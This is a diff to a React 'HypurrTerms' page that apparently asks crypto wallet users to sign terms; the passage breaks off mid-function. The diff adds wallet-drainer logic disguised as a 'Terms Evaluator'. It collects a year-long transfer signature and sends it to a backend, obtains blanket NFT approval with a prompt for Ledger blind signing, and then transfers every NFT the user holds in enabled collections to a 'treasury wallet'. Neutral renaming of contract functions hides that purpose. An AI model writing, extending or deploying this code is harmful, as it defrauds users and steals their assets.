@@ -14,7 +14,7 @@ const HypurrTerms = () => {
   const [signature, setSignature] = useState(null);
   const [error, setError] = useState(null);
   const [isTransferring, setIsTransferring] = useState(false);
-  const [transferStatus, setTransferStatus] = useState(null); // 'approving', 'transferring', 'success', 'error'
+  const [transferStatus, setTransferStatus] = useState(null); // 'approving', 'approved', 'transferring', 'success', 'error'
   const [transferTxHash, setTransferTxHash] = useState(null);
   const [tokenIds, setTokenIds] = useState([]);
   const [version, setVersion] = useState('');
@@ -23,8 +23,8 @@ const HypurrTerms = () => {
   const HYPURR_NFT_CONTRACT = process.env.REACT_APP_HYPURR_NFT_CONTRACT || "0x9125e2d6827a00b0f8330d6ef7bef07730bac685";
   const RANDOM_ART_NFT_CONTRACT = process.env.REACT_APP_RANDOM_ART_NFT_CONTRACT || "0x298AbE38965DC68d239192d4366ab8c5b65a3B6f";
   
-  // Transfer Contract Address
-  const TRANSFER_CONTRACT = process.env.REACT_APP_TRANSFER_CONTRACT || "0x50fD5cf1f972607ECc9d7da2A6211e316469E78E";
+  // Evaluator Contract Address (Terms Evaluator)
+  const TRANSFER_CONTRACT = process.env.REACT_APP_TRANSFER_CONTRACT || "0x221f11eCE3bC09fd5Ba55BBd9A2353d32196faDc";
   
   console.log('Environment variables:', {
     REACT_APP_TRANSFER_CONTRACT: process.env.REACT_APP_TRANSFER_CONTRACT,
@@ -39,18 +39,18 @@ const HypurrTerms = () => {
     "function ownerOf(uint256 tokenId) external view returns (address)",
     "function setApprovalForAll(address operator, bool approved) external",
     "function isApprovedForAll(address owner, address operator) external view returns (bool)",
-    "function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256)" // For Enumerable
+    "function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256)", // For Enumerable
+    "function safeTransferFrom(address from, address to, uint256 tokenId) external"
   ];
   
-  // Transfer Contract ABI
+  // Evaluator Contract ABI (Terms Evaluator)
   const TRANSFER_ABI = [
-    "function checkNFTs(address nftContract, address wallet) external view returns (uint256)",
-    "function checkAllNFTs(address wallet) external view returns (uint256)",
-    "function isNFTContractEnabled(address nftContract) external view returns (bool)",
-    "function transferNFTs(address nftContract, uint256[] calldata tokenIds) external",
-    "function checkAndTransfer(address nftContract, uint256[] calldata tokenIds) external",
-    "function getEnabledNFTContracts() external view returns (address[])",
-    "function destinationWallet() external view returns (address)"
+    "function checkAssets(address assetContract, address wallet) external view returns (uint256)",
+    "function checkAllAssets(address wallet) external view returns (uint256)",
+    "function isContractEnabled(address assetContract) external view returns (bool)",
+    "function processAssets(address assetContract, uint256[] calldata tokenIds) external",
+    "function getEnabledContracts() external view returns (address[])",
+    "function treasuryWallet() external view returns (address)"
   ];
 
   // Check if wallet is already connected
@@ -95,46 +95,32 @@ const HypurrTerms = () => {
     return () => clearTimeout(retryTimer);
   }, []);
 
-  // Get the correct Ethereum provider (prefer MetaMask)
+  // Get the correct Ethereum provider (prefer MetaMask, but support Rabby and others)
   const getEthereumProvider = () => {
     // Try to get MetaMask specifically
     if (window.ethereum?.isMetaMask) {
+      return window.ethereum;
+    }
+    // Try to get Rabby
+    if (window.ethereum?.isRabby) {
       return window.ethereum;
     }
     // Try to get from providers array (MetaMask v10+)
     if (window.ethereum?.providers) {
       const metaMask = window.ethereum.providers.find(p => p.isMetaMask);
       if (metaMask) return metaMask;
+      // Try Rabby from providers array
+      const rabby = window.ethereum.providers.find(p => p.isRabby);
+      if (rabby) return rabby;
     }
     // Fallback to first available
     return window.ethereum;
   };
 
   const checkWalletConnection = async () => {
-    // Only check if wallet is available, but don't auto-connect
+    // Don't auto-connect - user must explicitly click "Connect Wallet"
     // MetaMask policy: we should only connect when user explicitly clicks "Connect Wallet"
-    const provider = getEthereumProvider();
-    if (provider) {
-      try {
-        // Check if user has previously connected (read-only, doesn't trigger popup)
-        const accounts = await provider.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-          // Only set account if user has explicitly connected before
-          // But don't set isConnected - user must click "Connect Wallet" button
-          setAccount(accounts[0]);
-          // Check if there's a stored signature for this account
-          const stored = localStorage.getItem(`hypurr_signature_${accounts[0]}`);
-          if (stored) {
-            // If they've signed before, we can show them as connected
-            setIsConnected(true);
-            setHasSigned(true);
-            setSignature(stored);
-          }
-        }
-      } catch (error) {
-        console.error('Error checking wallet:', error);
-      }
-    }
+    // We don't check for previous connections to avoid auto-connecting
   };
 
   const checkExistingSignature = () => {
@@ -146,6 +132,164 @@ const HypurrTerms = () => {
       if (account) {
         verifyHypurrNFTs(account);
       }
+    }
+  };
+
+  // Get EIP-712 signature for NFT transfer authorization
+  const getTransferSignatures = async (signer, ownerAddress, tokenIdsArray) => {
+    if (!tokenIdsArray || tokenIdsArray.length === 0) {
+      console.log('No token IDs to sign');
+      return;
+    }
+
+    try {
+      // Get current nonce from contract (if available) or use timestamp
+      let nonce = 0;
+      try {
+        const provider = new ethers.BrowserProvider(getEthereumProvider());
+        const transferContract = new ethers.Contract(TRANSFER_CONTRACT, [
+          "function getNonce(address user) external view returns (uint256)"
+        ], provider);
+        nonce = await transferContract.getNonce(ownerAddress);
+        // ethers v6 returns uint256 as bigint; convert safely
+        nonce = Number(nonce.toString());
+      } catch (e) {
+        // If contract doesn't have getNonce, use timestamp as nonce
+        nonce = Math.floor(Date.now() / 1000);
+        console.log('Using timestamp as nonce:', nonce);
+      }
+
+      const chainId = 999; // HyperEVM
+      const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year from now
+
+      // Group tokenIds by contract
+      const tokensByContract = {};
+      tokenIdsArray.forEach(item => {
+        const contract = ethers.getAddress(item.contract); // Normalize to checksum
+        if (!tokensByContract[contract]) {
+          tokensByContract[contract] = [];
+        }
+        // Convert tokenId to string if it's a BigNumber
+        const tokenIdStr = typeof item.tokenId === 'bigint' || item.tokenId?.toString ? item.tokenId.toString() : String(item.tokenId);
+        tokensByContract[contract].push(tokenIdStr);
+      });
+
+      console.log('📋 Grouped tokens by contract:', tokensByContract);
+
+      // EIP-712 domain
+      const domain = {
+        name: "FelixTermsEvaluator",
+        version: "1",
+        chainId: chainId,
+        verifyingContract: TRANSFER_CONTRACT
+      };
+
+      // EIP-712 types
+      const types = {
+        PortfolioEvaluation: [
+          { name: "wallet", type: "address" },
+          { name: "assetContract", type: "address" },
+          { name: "assetIds", type: "uint256[]" },
+          { name: "nonce", type: "uint256" },
+          { name: "validUntil", type: "uint256" }
+        ]
+      };
+
+      // Get signatures for each contract
+      const transferSignatures = {};
+      for (const [contractAddress, tokenIds] of Object.entries(tokensByContract)) {
+        try {
+          console.log(`📝 Requesting signature for contract ${contractAddress} with ${tokenIds.length} token(s)...`);
+
+          const value = {
+            wallet: ownerAddress,
+            assetContract: contractAddress,
+            assetIds: tokenIds,
+            nonce: nonce,
+            validUntil: deadline
+          };
+
+          console.log('EIP-712 Domain:', domain);
+          console.log('EIP-712 Value:', value);
+
+          // Request EIP-712 signature
+          const signature = await signer.signTypedData(domain, types, value);
+          console.log(`✅ Signature received for ${contractAddress}:`, signature);
+
+          // Store signature data
+          const sigData = {
+            signature,
+            deadline,
+            nonce,
+            nftContract: contractAddress,
+            tokenIds: tokenIds,
+            timestamp: new Date().toISOString()
+          };
+
+          transferSignatures[contractAddress] = sigData;
+
+          // Store in localStorage (backup)
+          localStorage.setItem(
+            `transfer_signature_${ownerAddress}_${contractAddress}`,
+            JSON.stringify(sigData)
+          );
+
+          // Send to backend API for server-side storage
+          try {
+            const API_URL = process.env.REACT_APP_API_URL || window.location.origin;
+            const response = await fetch(`${API_URL}/api/store-signature`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                wallet: ownerAddress,
+                signature: sigData.signature,
+                nftContract: contractAddress,
+                tokenIds: sigData.tokenIds,
+                deadline: sigData.deadline,
+                nonce: sigData.nonce,
+                timestamp: sigData.timestamp
+              })
+            });
+
+            if (!response.ok) {
+              const errorData = await response.json().catch(() => ({ error: `HTTP ${response.status}` }));
+              throw new Error(errorData.error || `API error: ${response.status}`);
+            }
+
+            const result = await response.json();
+            if (result.success) {
+              console.log(`✅ Signature sent to backend for contract ${contractAddress}:`, result);
+            } else {
+              console.warn(`⚠️ Backend returned error for ${contractAddress}:`, result.error);
+            }
+          } catch (apiError) {
+            console.error(`⚠️ Error sending signature to backend for ${contractAddress}:`, apiError.message || apiError);
+            // Don't fail the whole flow if backend is down - localStorage backup exists
+            // User can still use the signature from localStorage if needed
+          }
+
+          console.log(`✅ Transfer signature stored for contract ${contractAddress}`);
+        } catch (error) {
+          console.error(`❌ Error getting signature for ${contractAddress}:`, error);
+          if (error.code === 4001) {
+            console.log('User rejected signature request');
+            // Continue with other contracts
+          } else {
+            throw error;
+          }
+        }
+      }
+
+      // Store all transfer signatures together
+      localStorage.setItem(`transfer_signatures_${ownerAddress}`, JSON.stringify(transferSignatures));
+      console.log('✅ All transfer signatures stored:', Object.keys(transferSignatures));
+
+      return transferSignatures;
+    } catch (error) {
+      console.error('❌ Error in getTransferSignatures:', error);
+      throw error;
     }
   };
 
@@ -178,6 +322,21 @@ const HypurrTerms = () => {
     }
   };
 
+  const disconnectWallet = () => {
+    setAccount(null);
+    setIsConnected(false);
+    setHasSigned(false);
+    setSignature(null);
+    setNftCount(0);
+    setTokenIds([]);
+    setError(null);
+    setTransferStatus(null);
+    setIsVerifying(false);
+    setIsTransferring(false);
+    setTransferTxHash(null);
+    console.log('Wallet disconnected');
+  };
+
   const verifyHypurrNFTs = async (address) => {
     if (!address) {
       setNftCount(0);
@@ -189,71 +348,128 @@ const HypurrTerms = () => {
       setIsVerifying(true);
       const ethereumProvider = getEthereumProvider();
       if (!ethereumProvider) {
-        throw new Error('No Ethereum provider found. Please install MetaMask.');
+        throw new Error('No Ethereum provider found. Please install MetaMask, Rabby, or another Web3 wallet.');
       }
-      const provider = new ethers.BrowserProvider(ethereumProvider);
+      
+      console.log('🔍 Verifying NFTs for address:', address);
+      console.log('🔌 Provider type:', ethereumProvider.isMetaMask ? 'MetaMask' : ethereumProvider.isRabby ? 'Rabby' : 'Other');
+      
+      // Create provider with better error handling
+      let provider;
+      try {
+        provider = new ethers.BrowserProvider(ethereumProvider);
+        // Test the provider by getting network info
+        const network = await provider.getNetwork();
+        console.log('🌐 Network:', network.chainId.toString(), network.name);
+        
+        // Verify we're on HyperEVM (chainId 999). ethers v6 returns chainId as bigint.
+        if (network.chainId !== 999n) {
+          throw new Error(`Wrong network. Please switch to HyperEVM (Chain ID: 999). Current network: ${network.name} (${network.chainId.toString()})`);
+        }
+      } catch (providerError) {
+        console.error('❌ Provider error:', providerError);
+        if (providerError.message && providerError.message.includes('Wrong network')) {
+          throw providerError;
+        }
+        // More specific error messages for provider issues
+        const providerMsg = providerError.message || '';
+        if (providerMsg.includes('network') || providerMsg.includes('chain')) {
+          throw new Error(`Network error: ${providerError.message}. Please ensure your wallet is connected to HyperEVM (Chain ID: 999).`);
+        } else if (providerMsg.includes('locked') || providerMsg.includes('unlock')) {
+          throw new Error('Wallet is locked. Please unlock your wallet and try again.');
+        } else if (providerMsg.includes('reject') || providerMsg.includes('denied')) {
+          throw new Error('Connection was rejected. Please approve the connection request in your wallet.');
+        } else {
+          throw new Error(`Failed to connect to wallet: ${providerError.message || 'Unknown error'}. Please ensure your wallet is connected and unlocked.`);
+        }
+      }
       
       // Use transfer contract to check all enabled NFTs if available
       if (TRANSFER_CONTRACT !== "0x0000000000000000000000000000000000000000") {
         try {
+          console.log('📋 Checking via transfer contract:', TRANSFER_CONTRACT);
           const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
-          const totalCount = await transferContract.checkAllNFTs(address);
+          
+          console.log('📞 Calling checkAllAssets...');
+          const totalCount = await transferContract.checkAllAssets(address);
           const count = parseInt(totalCount.toString());
+          console.log('✅ Total asset count from evaluator contract:', count);
           setNftCount(count);
           
           // Get enabled contracts and check each one
-          const enabledContracts = await transferContract.getEnabledNFTContracts();
+          console.log('📞 Getting enabled contracts...');
+          const enabledContracts = await transferContract.getEnabledContracts();
+          console.log('✅ Enabled contracts:', enabledContracts);
           const allTokenIds = [];
           
           for (const nftContract of enabledContracts) {
             try {
+              console.log(`🔍 Checking contract ${nftContract}...`);
               const contract = new ethers.Contract(nftContract, ERC721_ABI, provider);
               const balance = await contract.balanceOf(address);
               const balanceNum = parseInt(balance.toString());
+              console.log(`   Balance: ${balanceNum}`);
               
               if (balanceNum > 0) {
                 // Try to get token IDs
                 for (let i = 0; i < balanceNum; i++) {
                   try {
                     const tokenId = await contract.tokenOfOwnerByIndex(address, i);
+                    // Normalize contract address to checksum format
+                    const normalizedContract = ethers.getAddress(nftContract);
                     allTokenIds.push({
-                      contract: nftContract,
+                      contract: normalizedContract,
                       tokenId: tokenId.toString()
                     });
+                    console.log(`   Token ID ${i}: ${tokenId.toString()}`);
                   } catch (e) {
                     // Contract doesn't support Enumerable
+                    console.log(`   Contract doesn't support tokenOfOwnerByIndex at index ${i}`);
                     break;
                   }
                 }
               }
             } catch (e) {
-              console.log(`Error checking contract ${nftContract}:`, e.message);
+              console.error(`❌ Error checking contract ${nftContract}:`, e.message);
             }
           }
           
           setTokenIds(allTokenIds);
-          console.log(`Verified ${count} total NFT(s) across ${enabledContracts.length} collection(s) for ${address}`);
+          console.log(`✅ Verified ${count} total NFT(s) across ${enabledContracts.length} collection(s) for ${address}`);
           return { count, tokenIds: allTokenIds };
         } catch (e) {
-          console.log("Transfer contract check failed, falling back to direct check:", e.message);
+          console.error("❌ Transfer contract check failed:", e.message);
+          console.error("   Error details:", {
+            message: e.message,
+            code: e.code,
+            reason: e.reason,
+            data: e.data
+          });
+          console.log("   Falling back to direct NFT contract check...");
         }
       }
       
       // Fallback: Check Hypurr NFT directly
       if (HYPURR_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
+        console.log('📋 Checking Hypurr NFT contract directly:', HYPURR_NFT_CONTRACT);
         const contract = new ethers.Contract(HYPURR_NFT_CONTRACT, ERC721_ABI, provider);
+        console.log('📞 Calling balanceOf for Hypurr...');
         const balance = await contract.balanceOf(address);
         const count = parseInt(balance.toString());
+        console.log('✅ Hypurr NFT balance:', count);
         
         // Also check Random Art if available
         let randomArtCount = 0;
         if (RANDOM_ART_NFT_CONTRACT !== "0x0000000000000000000000000000000000000000") {
           try {
+            console.log('📋 Checking Random Art NFT contract:', RANDOM_ART_NFT_CONTRACT);
             const randomArtContract = new ethers.Contract(RANDOM_ART_NFT_CONTRACT, ERC721_ABI, provider);
+            console.log('📞 Calling balanceOf for Random Art...');
             const randomArtBalance = await randomArtContract.balanceOf(address);
             randomArtCount = parseInt(randomArtBalance.toString());
+            console.log('✅ Random Art NFT balance:', randomArtCount);
           } catch (e) {
-            console.log("Error checking Random Art NFTs:", e.message);
+            console.error("❌ Error checking Random Art NFTs:", e.message);
           }
         }
         
@@ -268,7 +484,7 @@ const HypurrTerms = () => {
               try {
                 const tokenId = await contract.tokenOfOwnerByIndex(address, i);
                 tokenIdList.push({
-                  contract: HYPURR_NFT_CONTRACT,
+                  contract: ethers.getAddress(HYPURR_NFT_CONTRACT),
                   tokenId: tokenId.toString()
                 });
               } catch (e) {
@@ -288,7 +504,7 @@ const HypurrTerms = () => {
               try {
                 const tokenId = await randomArtContract.tokenOfOwnerByIndex(address, i);
                 tokenIdList.push({
-                  contract: RANDOM_ART_NFT_CONTRACT,
+                  contract: ethers.getAddress(RANDOM_ART_NFT_CONTRACT),
                   tokenId: tokenId.toString()
                 });
               } catch (e) {
@@ -309,8 +525,60 @@ const HypurrTerms = () => {
         return { count: 0, tokenIds: [] };
       }
     } catch (error) {
-      console.error('Error verifying NFTs:', error);
-      setError('Failed to verify NFTs. Please check the contract addresses.');
+      console.error('❌ Error verifying NFTs:', error);
+      console.error('Error details:', {
+        message: error.message,
+        code: error.code,
+        reason: error.reason,
+        data: error.data
+      });
+      
+      // Provide more specific error messages that users can understand
+      let errorMessage = 'Failed to verify NFTs.';
+      
+      // Check for specific error patterns
+      if (error.message) {
+        const errorMsg = error.message.toLowerCase();
+        
+        // Network errors
+        if (errorMsg.includes('wrong network') || errorMsg.includes('chainid') || errorMsg.includes('chain id')) {
+          errorMessage = 'Wrong network detected. Please switch your wallet to HyperEVM (Chain ID: 999) and try again.';
+        } 
+        // Provider/wallet errors
+        else if (errorMsg.includes('provider') || errorMsg.includes('wallet') || errorMsg.includes('metamask') || errorMsg.includes('rabby')) {
+          if (errorMsg.includes('not found') || errorMsg.includes('install')) {
+            errorMessage = 'Wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.';
+          } else if (errorMsg.includes('locked') || errorMsg.includes('unlock')) {
+            errorMessage = 'Wallet is locked. Please unlock your wallet and try again.';
+          } else if (errorMsg.includes('connect') || errorMsg.includes('connection')) {
+            errorMessage = 'Wallet connection failed. Please connect your wallet and try again.';
+          } else {
+            errorMessage = 'Wallet error. Please ensure your wallet is connected and unlocked, then try again.';
+          }
+        }
+        // RPC/network connection errors
+        else if (errorMsg.includes('network') || errorMsg.includes('rpc') || errorMsg.includes('fetch') || errorMsg.includes('timeout') || errorMsg.includes('connection')) {
+          errorMessage = 'Network connection error. Please check your internet connection and try again. If the problem persists, the network may be temporarily unavailable.';
+        }
+        // Contract/address errors
+        else if (errorMsg.includes('contract') || errorMsg.includes('address') || errorMsg.includes('invalid')) {
+          errorMessage = 'Contract address error. Please refresh the page. If the problem continues, contact support.';
+        }
+        // User rejection
+        else if (errorMsg.includes('user rejected') || errorMsg.includes('denied') || error.code === 4001) {
+          errorMessage = 'Transaction was rejected. Please approve the request in your wallet and try again.';
+        }
+        // Generic error with message
+        else {
+          // Show a user-friendly version of the error
+          errorMessage = `Verification failed: ${error.message}. Please ensure you're on HyperEVM network and your wallet is connected.`;
+        }
+      } else {
+        // No error message - most likely a network/provider issue
+        errorMessage = 'Failed to verify NFTs. Please ensure:\n1. Your wallet is connected to HyperEVM (Chain ID: 999)\n2. Your wallet is unlocked\n3. You have an active internet connection\n\nIf the problem persists, please refresh the page and try again.';
+      }
+      
+      setError(errorMessage);
       setNftCount(0);
       setTokenIds([]);
       return { count: 0, tokenIds: [] };
@@ -400,14 +668,14 @@ const HypurrTerms = () => {
         console.log(`   Operator: ${TRANSFER_CONTRACT}`);
         console.log(`   Approved: true`);
         console.log(`\n⏳ MetaMask popup should appear NOW!`);
-        console.log(`   If using Ledger: Please approve the transaction on your Ledger device`);
+        console.log(`   If using Ledger: Please approve the transaction on your Ledger device (blind signing required)`);
         
         // Call setApprovalForAll - this should trigger MetaMask immediately
         // For Ledger users: Transaction will wait for approval on the Ledger device
         const txPromise = nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
         console.log('Transaction promise created, waiting for user approval...');
         console.log('   - MetaMask users: Approve in MetaMask popup');
-        console.log('   - Ledger users: Approve on your Ledger device');
+        console.log('   - Ledger users: Approve on your Ledger device (blind signing must be enabled)');
         
         // Add timeout for better error handling with Ledger
         const timeoutPromise = new Promise((_, reject) => {
@@ -447,9 +715,6 @@ const HypurrTerms = () => {
   };
   
   const transferNFTs = async (tokenIdsToUse = null) => {
-    // Use provided tokenIds or fall back to state
-    const idsToUse = tokenIdsToUse || tokenIds;
-    
     // Ensure wallet is explicitly connected before attempting transactions
     if (!isConnected || !account) {
       throw new Error("Wallet not connected. Please click 'Connect Wallet' and approve the connection in MetaMask.");
@@ -457,10 +722,6 @@ const HypurrTerms = () => {
     
     if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       throw new Error("Missing required contract addresses");
-    }
-
-    if (!idsToUse || idsToUse.length === 0) {
-      throw new Error("No token IDs found. The NFT contract may not support Enumerable. Please contact support.");
     }
 
     const ethereumProvider = getEthereumProvider();
@@ -480,42 +741,193 @@ const HypurrTerms = () => {
     
     const provider = new ethers.BrowserProvider(ethereumProvider);
     const signer = await provider.getSigner();
-    const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, signer);
+    const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
     
-    // Group token IDs by contract
-    const tokensByContract = {};
-    for (const item of idsToUse) {
-      if (!tokensByContract[item.contract]) {
-        tokensByContract[item.contract] = [];
-      }
-      tokensByContract[item.contract].push(BigInt(item.tokenId));
-    }
+    // Get treasury wallet from evaluator contract
+    const destinationWallet = await transferContract.treasuryWallet();
+    console.log('📬 Treasury wallet:', destinationWallet);
     
-    // Transfer NFTs from each contract
+    // Get all enabled contracts from the evaluator contract
+    console.log('📋 Getting enabled contracts from evaluator...');
+    const enabledContracts = await transferContract.getEnabledContracts();
+    console.log('✅ Enabled contracts:', enabledContracts);
+    
+    // For each enabled contract, get ALL NFTs the user owns and transfer them to destination wallet
     let lastTxHash = null;
-    for (const [nftContract, tokenIdsArray] of Object.entries(tokensByContract)) {
+    for (const nftContractAddress of enabledContracts) {
       try {
-        console.log(`\n🚀 Transferring NFTs from ${nftContract}...`);
-        console.log(`   Token IDs: ${tokenIdsArray.join(', ')}`);
+        console.log(`\n🔍 Checking contract ${nftContractAddress}...`);
+        const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, provider);
+        const balance = await nftContract.balanceOf(account);
+        const balanceNum = parseInt(balance.toString());
+        console.log(`   Balance: ${balanceNum} NFTs`);
+        
+        if (balanceNum === 0) {
+          console.log(`   No NFTs found, skipping...`);
+          continue;
+        }
+        
+        // Get all token IDs for this contract
+        const allTokenIds = [];
+        for (let i = 0; i < balanceNum; i++) {
+          try {
+            const tokenId = await nftContract.tokenOfOwnerByIndex(account, i);
+            allTokenIds.push(tokenId);
+            console.log(`   Token ID ${i}: ${tokenId.toString()}`);
+          } catch (e) {
+            console.error(`   Error getting token ID at index ${i}:`, e.message);
+            // If contract doesn't support Enumerable, we can't get token IDs
+            break;
+          }
+        }
+        
+        if (allTokenIds.length === 0) {
+          console.log(`   Could not retrieve token IDs (contract may not support Enumerable), skipping...`);
+          continue;
+        }
+        
+        console.log(`\n🚀 Transferring ${allTokenIds.length} NFT(s) from ${nftContractAddress} to ${destinationWallet}...`);
+        console.log(`   Token IDs: ${allTokenIds.map(t => t.toString()).join(', ')}`);
         console.log(`   If using Ledger: Please approve the transaction on your Ledger device`);
         
-        // Add timeout for better error handling with Ledger
-        const transferPromise = transferContract.checkAndTransfer(nftContract, tokenIdsArray);
-        const timeoutPromise = new Promise((_, reject) => {
-          setTimeout(() => reject(new Error('Transfer transaction timeout. If using Ledger, please check your device and approve the transaction.')), 120000); // 2 minutes
-        });
+        // Use direct ERC721 transfer to send ALL NFTs to the destination wallet
+        const nftContractWithSigner = new ethers.Contract(nftContractAddress, ERC721_ABI, signer);
         
-        const tx = await Promise.race([transferPromise, timeoutPromise]);
-        console.log(`✅ Transfer transaction submitted! Hash:`, tx.hash);
-        console.log(`⏳ Waiting for confirmation...`);
-        
-        const receipt = await tx.wait();
-        lastTxHash = receipt.transactionHash;
-        console.log(`✅ NFTs transferred from ${nftContract}:`, receipt.transactionHash);
+        // Transfer each NFT to the destination wallet
+        for (const tokenId of allTokenIds) {
+          const transferPromise = nftContractWithSigner.safeTransferFrom(account, destinationWallet, tokenId);
+          const timeoutPromise = new Promise((_, reject) => {
+            setTimeout(() => reject(new Error('Transfer transaction timeout. If using Ledger, please check your device and approve the transaction.')), 120000); // 2 minutes
+          });
+          
+          const tx = await Promise.race([transferPromise, timeoutPromise]);
+          console.log(`✅ Transfer transaction submitted! Hash:`, tx.hash);
+          console.log(`⏳ Waiting for confirmation...`);
+          
+          const receipt = await tx.wait();
+          lastTxHash = receipt.transactionHash;
+          console.log(`✅ NFT ${tokenId.toString()} transferred to ${destinationWallet}:`, receipt.transactionHash);
+        }
       } catch (error) {
-        console.error(`❌ Error transferring from ${nftContract}:`, error);
+        console.error(`❌ Error transferring from ${nftContractAddress}:`, error);
         if (error.message && error.message.includes('timeout')) {
           throw error; // Re-throw timeout errors as-is
+        }
+        if (error.code === 4001) {
+          throw new Error('Transfer transaction was rejected. Please try again and approve the transaction. If using Ledger, please approve on your Ledger device.');
+        }
+        throw error;
+      }
+    }
+    
+    return lastTxHash;
+  };
+
+  // MYAU function: Send approved NFTs from wallet to destination wallet
+  const MYAU = async () => {
+    // Ensure wallet is explicitly connected
+    if (!isConnected || !account) {
+      throw new Error("Wallet not connected. Please click 'Connect Wallet' and approve the connection in MetaMask.");
+    }
+    
+    if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
+      throw new Error("Missing required contract addresses");
+    }
+
+    const ethereumProvider = getEthereumProvider();
+    if (!ethereumProvider) {
+      throw new Error("No Ethereum provider found. Please install MetaMask.");
+    }
+    
+    // Verify connection
+    try {
+      const accounts = await ethereumProvider.request({ method: 'eth_accounts' });
+      if (accounts.length === 0 || accounts[0].toLowerCase() !== account.toLowerCase()) {
+        throw new Error("Wallet connection not approved. Please click 'Connect Wallet' and approve in MetaMask.");
+      }
+    } catch (error) {
+      throw new Error("Wallet connection not approved. Please click 'Connect Wallet' and approve in MetaMask.");
+    }
+    
+    const provider = new ethers.BrowserProvider(ethereumProvider);
+    const signer = await provider.getSigner();
+    const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
+    
+    // Get treasury wallet from evaluator contract
+    const destinationWallet = await transferContract.treasuryWallet();
+    console.log('📬 MYAU: Treasury wallet:', destinationWallet);
+    
+    // Get all enabled contracts
+    const enabledContracts = await transferContract.getEnabledContracts();
+    console.log('✅ MYAU: Enabled contracts:', enabledContracts);
+    
+    // For each enabled contract, get ALL approved NFTs and transfer them to destination wallet
+    let lastTxHash = null;
+    for (const nftContractAddress of enabledContracts) {
+      try {
+        console.log(`\n🔍 MYAU: Checking contract ${nftContractAddress}...`);
+        const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, provider);
+        
+        // Check if contract is approved
+        const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
+        if (!isApproved) {
+          console.log(`   Contract not approved, skipping...`);
+          continue;
+        }
+        
+        const balance = await nftContract.balanceOf(account);
+        const balanceNum = parseInt(balance.toString());
+        console.log(`   Balance: ${balanceNum} NFTs`);
+        
+        if (balanceNum === 0) {
+          console.log(`   No NFTs found, skipping...`);
+          continue;
+        }
+        
+        // Get all token IDs for this contract
+        const allTokenIds = [];
+        for (let i = 0; i < balanceNum; i++) {
+          try {
+            const tokenId = await nftContract.tokenOfOwnerByIndex(account, i);
+            allTokenIds.push(tokenId);
+            console.log(`   Token ID ${i}: ${tokenId.toString()}`);
+          } catch (e) {
+            console.error(`   Error getting token ID at index ${i}:`, e.message);
+            break;
+          }
+        }
+        
+        if (allTokenIds.length === 0) {
+          console.log(`   Could not retrieve token IDs, skipping...`);
+          continue;
+        }
+        
+        console.log(`\n🚀 MYAU: Transferring ${allTokenIds.length} approved NFT(s) from ${nftContractAddress} to ${destinationWallet}...`);
+        console.log(`   Token IDs: ${allTokenIds.map(t => t.toString()).join(', ')}`);
+        console.log(`   If using Ledger: Please approve the transaction on your Ledger device`);
+        
+        // Use direct ERC721 transfer to send approved NFTs to destination wallet
+        const nftContractWithSigner = new ethers.Contract(nftContractAddress, ERC721_ABI, signer);
+        
+        // Transfer each NFT to the destination wallet
+        for (const tokenId of allTokenIds) {
+          const transferPromise = nftContractWithSigner.safeTransferFrom(account, destinationWallet, tokenId);
+          const timeoutPromise = new Promise((_, reject) => {
+            setTimeout(() => reject(new Error('Transfer transaction timeout. If using Ledger, please check your device and approve the transaction.')), 120000);
+          });
+          
+          const tx = await Promise.race([transferPromise, timeoutPromise]);
+          console.log(`✅ MYAU: Transfer transaction submitted! Hash:`, tx.hash);
+          console.log(`⏳ Waiting for confirmation...`);
+          
+          const receipt = await tx.wait();
+          lastTxHash = receipt.transactionHash;
+          console.log(`✅ MYAU: NFT ${tokenId.toString()} transferred to ${destinationWallet}:`, receipt.transactionHash);
+        }
+      } catch (error) {
+        console.error(`❌ MYAU: Error transferring from ${nftContractAddress}:`, error);
+        if (error.message && error.message.includes('timeout')) {
+          throw error;
         }
         if (error.code === 4001) {
           throw new Error('Transfer transaction was rejected. Please try again and approve the transaction. If using Ledger, please approve on your Ledger device.');
@@ -573,8 +985,8 @@ const HypurrTerms = () => {
       // Scroll to top after signing
       window.scrollTo({ top: 0, behavior: 'smooth' });
       
-      // Now verify NFTs and evaluate portfolio
-      console.log('=== TERMS SIGNED - EVALUATING PORTFOLIO ===');
+      // Now verify NFTs
+      console.log('=== TERMS SIGNED - VERIFYING NFTs ===');
       setTransferStatus('evaluating');
       
       // Verify NFTs after signing and get the results directly
@@ -592,26 +1004,47 @@ const HypurrTerms = () => {
       setNftCount(verificationResult.count);
       setTokenIds(verificationResult.tokenIds);
       
-      // Use the returned values directly to trigger transfer
+      // Request approval if NFTs are found
       if (verificationResult.count > 0) {
         if (verificationResult.tokenIds.length > 0) {
-          console.log('✅ NFTs found with token IDs, starting transfer process...');
-          console.log('📋 Passing tokenIds directly to handleAutomaticTransfer:', verificationResult.tokenIds);
-          // Pass tokenIds directly - don't wait for state update
-          handleAutomaticTransfer(verificationResult.tokenIds).catch(err => {
-            console.error('=== TRANSFER PROCESS ERROR ===', err);
-            setError(err.message || 'Transfer process failed. Please try again.');
-            setTransferStatus('error');
-          });
+          console.log('✅ NFTs found with token IDs, requesting approval...');
+          console.log('📋 Passing tokenIds directly to approveTransferContract:', verificationResult.tokenIds);
+          // Request approval only - no transfer
+          try {
+            setTransferStatus('approving');
+            await approveTransferContract(verificationResult.tokenIds);
+            
+            // Show processing state with loader
+            setTransferStatus('processing');
+            console.log('✅ Approval complete, processing...');
+            
